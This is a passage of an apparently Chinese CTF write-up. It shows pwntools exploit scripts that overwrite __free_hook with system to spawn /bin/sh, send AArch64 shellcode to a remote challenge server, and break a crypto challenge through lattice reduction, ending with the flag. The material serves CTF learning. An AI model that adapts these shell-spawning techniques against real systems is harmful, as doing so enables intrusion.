&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x2B\x0F\x08\x03&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x73&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x2A\x00\x06\x70\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# Add 2&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x2A\x00\x07\x70\x03&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# Add 3&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x2F\x00\x06&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# delete 2&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x2F\x00\x04&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# delete 0&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x2A\x00\x04\x70\x01&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# Add 0&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x2A\x00\x06\x70\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# Add 2&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x2A\x00\x08\x70\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# Add free_hook&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x2F\x00\x06&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# delete 2&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendlineafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;cmd&amp;gt; &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;sleep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0.1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;FMYY&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;sleep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0.1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;FMYY&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;sleep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0.1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x10&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; 
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pos:0,4&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;u64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;drop&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ljust&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x4000000000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xF10&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x154000&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;info&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;LIBC:&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;info&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;__malloc_Hook:&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;__malloc_hook&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;system&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;system&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;free_hook&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;__free_hook&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;info&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;__free_hook:&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;free_hook&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;FMYY&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;sleep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0.1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;FMYY&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;sleep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0.1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x100&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;free_hook&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;sleep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0.1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/bin/sh&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;sleep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0.1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;sleep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0.1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;quite&#34;&gt;quite&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#coding=utf-8&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&amp;#39;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;X22: 0x100000000000
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;X21: OPCode_Memory
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;N:0 Index:0x28;  X22 --;opcode+=1
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;N:1	Index:0x29;  X22 ++;opcode+=1
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;N:2	Index:0x2A; [X22]++;opcode+=1;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;N:3	Index:0x2F; [X22]--;opcode+=1;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;N:4	Index:0x40; _IO_putc(X22);opcode+=1;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;N:5	Index:0x23; _IO_getc(X22);opcode+=1;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;N:6	Index:0x5B; 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;N:7	Index:0x5D;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;N:8	Index:0x00;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;N:9	Index:0x47; Call 0x100000000000
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;N:A Index:0x01; Default;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#p = process([&amp;#39;qemu-aarch64&amp;#39;,&amp;#39;-g&amp;#39;,&amp;#39;6666&amp;#39;,&amp;#39;-L&amp;#39;,&amp;#39;.&amp;#39;,&amp;#39;./main&amp;#39;])&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;8.140.179.11&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;51322&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xE1\x45\x8C\xD2\x21\xCD\xAD\xF2\xE1\x65\xCE\xF2\x01\x0D\xE0\xF2\xE1\x8F\x1F\xF8\xE1\x03\x1F\xAA\xE2\x03\x1F\xAA\xE0\x63\x21\x8B\xA8\x1B\x80\xD2\xE1\x66\x02\xD4&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x23\x29&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x47&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;sleep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0.5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;crypto&#34;&gt;Crypto&lt;/h2&gt;
&lt;h3 id=&#34;simultaneous&#34;&gt;simultaneous&lt;/h3&gt;
&lt;p&gt;审计代码，发现x和y大小均约为381bit，z约为631bit，e和N为1024bit。
首先发现x很小且三次加密时所用的x相同，而e&lt;em&gt;x-y&lt;/em&gt;N=y*(p+q+1)-z_只有约893bit，与e和N相比都很小，所以构造格子进行格基规约：
sage: A = matrix(ZZ,4,[2**512,0,0,0,e1,-n1,0,0,e2,0,-n2,0,e3,0,0,-n3])
sage: B = A.transpose()
sage: C = B.LLL()
sage: C[0]
(8866336715717388426172963523471330954077188809904909656840498650956244748060448654334827362938608283011460454932611722549140899975837332516255422319218997339352725870280417222934472617692234368327945625080892989434758573490606357931772643305970422681049000558333001728, 23565804679746565933710388872729524528226359415562140615287656018817455800535466780287799003178367701822507942125498993654311133503025992126025046704035560696109076086415547740763302445007651443569886959741145900119997240641197056821966126478523677707529102803982641184, 108960871214576793022207296445632894090843538519696872165557959140648817747262325676571075528643507778206273055515718254598755429648600953278539486434738401784633970948810856056270409547951407224850758488218814477712938397264786375512963038875176200582202541244988064762, 104724522928227808113699830194721186205703616771719604100697952234782584810976846111816114359575185225135299113577201578471709313075817367107222881505195506424821820424051124267603014862466153889752001180168723756986189763744130308518039129969039000165646079670467289202)
sage: x = C[0][0]&amp;raquo;512
sage: x
661281602633708663826486920028427898009447098405701242291443669957936453059596989424786500921975783032016279781143
sage: isPrime(x)
1
构造如上所述的格子，可以从格基规约的结果中快速得到x。
得到x之后，仍然根据e*x-y*N=y*(p+q+1)-z_&amp;lt;N，得到y=e*x//N，所以三次的y都可以用这个等式求出来。
sage: y3 = e3*x//n3
sage: isPrime(y3)
1
sage: y2 = e2*x//n2
sage: isPrime(y2)
1
sage: y1 = e1*x//n1
sage: isPrime(y1)
1
x、y都知道了，所以余数k=y*(p+q+1)-z_也可以相应地求出
sage: k3 = e3*x-y3*n3
sage: k2 = e2*x-y2*n2
sage: k1 = e1*x-y1*n1
分析余项k的结构：
k = y*(p+q+1)-z_
= y*(p+q+1) - zbound - ((p + 1)*(q + 1)*y - zbound) % x
= y*(p+q+1) + int(((p-q) * round(n ** 0.25) * y) // (3 * (p + q))) - ((p + 1)*(q + 1)*y - zbound) % x&lt;/p&gt;
&lt;p&gt;在这个式子中，第三项((p + 1)*(q + 1)&lt;em&gt;y - zbound) % x，是对x取得的余数，所以它肯定是一个小于x的非负数；而第二项 int(((p-q) * round(n ** 0.25) * y) // (3 * (p + q)))的值与实数((p-q) * round(n ** 0.25) * y) / (3 * (p + q))的差不超过常数1。所以可以得到k - y&lt;/em&gt;(p+q+1+((p-q) * round(n ** 0.25)) / (3 * (p + q)))的绝对值是不会超过x+y的。而(x+y)//y是很小很小的，所以可以暂时忽略不计。&lt;/p&gt;
&lt;p&gt;所以令K = k//y，则几乎可以认为K=p+q+1+((p-q) * round(n ** 0.25)) / (3 * (p + q))。
这里round(n ** 0.25)已知，未知量只有p-q和p+q。
对整个等式进行简单的变形后可以得到用含p+q的式子表示p-q：
p - q = 3 * (p + q) * (K-1-(p+q)) / round(n ** 0.25)
而根据平方差公式，(p+q)^2 - (p-q)^2 = 4pq = 4n
所以令p+q=s，则上式可化为s&lt;em&gt;s-int(9&lt;/em&gt;s&lt;em&gt;s&lt;/em&gt;(K-1-s)&lt;em&gt;(K-1-s))/(round(n^0.25))^2 = 4n。
而这个方程可以用二分法求其近似整数解，然后稍微根据奇偶性做点相应的修正。
sage: def magic(K,N):
&amp;hellip;.:     l = 0
&amp;hellip;.:     r = K
&amp;hellip;.:     for i in range(515):
&amp;hellip;.:         s = (l+r)//2
&amp;hellip;.:         v = s&lt;/em&gt;s-int(s&lt;em&gt;s&lt;/em&gt;9*(K-1-s)*(K-1-s))//(round(N^0.25)*round(N^0.25))
&amp;hellip;.:         if(v&amp;lt;4*N):
&amp;hellip;.:             l = s
&amp;hellip;.:         else:
&amp;hellip;.:             r = s
&amp;hellip;.:     return r
&amp;hellip;.:
sage: s3 = magic(K3,n3)
sage: s2 = magic(K2,n2)
sage: s1 = magic(K1,n1)
sage: s3
18459018640955512832829048105711364903415072505002892754520813962752576865824290315357137127800833228562342513337961044655924159981814783588968959511015508
sage: s2
19511198066679441661645179970610060853694402093688175864187492448475141832783517018527146512367573855149291232173039125664151037907250865382648639649226905
sage: s2 = s2+1
sage: s1
19094603811148743548404150847713419121365563250591127608146415278074868880338697379102160497997619208075125156916806494003926028149361835606603268896884014&lt;/p&gt;
&lt;p&gt;三个p+q都求出来之后，就可以获取私钥d，正常解密得到flag。&lt;/p&gt;
&lt;p&gt;sage: d1 = inverse(e1,n1+s1+1)
sage: d2 = inverse(e2,n2+s2+1)
sage: d3 = inverse(e3,n3+s3+1)
sage: def decrypt(c, d, n):
&amp;hellip;.:     n = int(n)
&amp;hellip;.:     size = n.bit_length() // 2
&amp;hellip;.:
&amp;hellip;.:     c_high, c_low = c
&amp;hellip;.:     b = (c_low&lt;strong&gt;2 - c_high&lt;/strong&gt;3) % n
&amp;hellip;.:     EC = EllipticCurve(Zmod(n), [0, b])
&amp;hellip;.:     m_high, m_low = (EC((c_high, c_low)) * d).xy()
&amp;hellip;.:     m_high, m_low = int(m_high), int(m_low)
&amp;hellip;.:
&amp;hellip;.:     return (m_high &amp;laquo; size) | m_low
&amp;hellip;.:
sage: m1 = decrypt(c1,d1,n1)
sage: m2 = decrypt(c2,d2,n2)
sage: m3 = decrypt(c3,d3,n3)
sage: long_to_bytes(m0^^m1^^m2^^m3)
b&amp;rsquo;flag{b4dd980a-cd0b-422a-bbee-e9005e1c6380}&#39;&lt;/p&gt;
</description>
